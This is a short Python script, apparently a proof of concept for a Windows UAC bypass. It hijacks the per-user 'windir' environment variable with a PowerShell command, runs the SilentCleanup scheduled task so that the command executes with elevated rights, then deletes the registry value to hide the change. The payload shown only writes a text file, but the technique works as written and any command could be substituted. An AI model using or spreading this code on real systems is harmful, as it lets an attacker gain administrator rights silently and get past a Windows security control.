import os, winreg, sys, time

hKey = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Environment", 0, winreg.KEY_ALL_ACCESS)
winreg.SetValueEx(hKey, "windir", 0, winreg.REG_EXPAND_SZ,
                          "powershell.exe -command echo abc > shit.txt" + " ")
time.sleep(2)
os.system("schtasks /run /tn \\Microsoft\\Windows\\DiskCleanup\\SilentCleanup /i")
time.sleep(2)
winreg.DeleteValue(hKey, "windir")
